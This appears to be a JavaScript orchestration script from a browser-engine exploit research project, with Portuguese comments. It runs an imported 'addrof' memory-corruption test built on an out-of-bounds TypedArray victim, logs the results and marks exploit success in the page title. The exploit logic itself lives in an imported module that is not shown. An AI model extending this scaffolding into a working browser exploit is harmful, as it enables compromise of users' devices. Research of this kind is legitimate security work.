// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_AggressiveGetterForAddrof,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_AggressiveGetterForAddrof"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_AggressiveGetterForAddrof(); 

    if (result.errorOccurredMain) { // Checa se houve erro principal no execute...
        logS3(`   RUNNER: Teste principal capturou ERRO: ${result.errorOccurredMain.name} - ${result.errorOccurredMain.message}.`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: MainTest ERR!`; 
    } else if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
        logS3(`   RUNNER: Teste de Iteração de Valores OOB Concluído.`, "good", FNAME_RUNNER);
        logS3(`   RUNNER: Detalhes da última iteração (via result.toJSON_details): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "info", FNAME_RUNNER);
        logS3(`   RUNNER: Stringify Output da última iteração: ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);

        // Logica para determinar o título com base nos resultados de todas as iterações
        let anyOverallSuccess = result.iteration_results_summary.some(r => r.getter_success || r.direct_success);
        let firstSuccessIter = result.iteration_results_summary.find(r => r.getter_success || r.direct_success);
        let anyM2TCObserved = result.iteration_results_summary.some(r => r.m2_tc); // Supondo que essa info é passada no summary

        if (anyOverallSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: AddrInM2 SUCCESS @ ${firstSuccessIter.oob_value}!`;
        } else if (anyM2TCObserved) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: M2_TC OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: All Iter Tested, No M2_TC?`;
        }
        
        // Log dos resultados de addrof da última iteração (ou da primeira bem-sucedida, conforme definido no execute)
        if (result.addrof_A_result) logS3(`    ADDROF M2.Getter (Last/Best Iter): ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        if (result.addrof_B_result) logS3(`    ADDROF M2.Direct (Last/Best Iter): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);

    } else {
        logS3(`   RUNNER: Nenhuma iteração de resultado encontrada.`, "warn", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: No Iter Results`;
    }

    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Heisenbug (${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Tested") && !document.title.includes("M2_TC OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA} Iterations Done`;
        }
    }
}
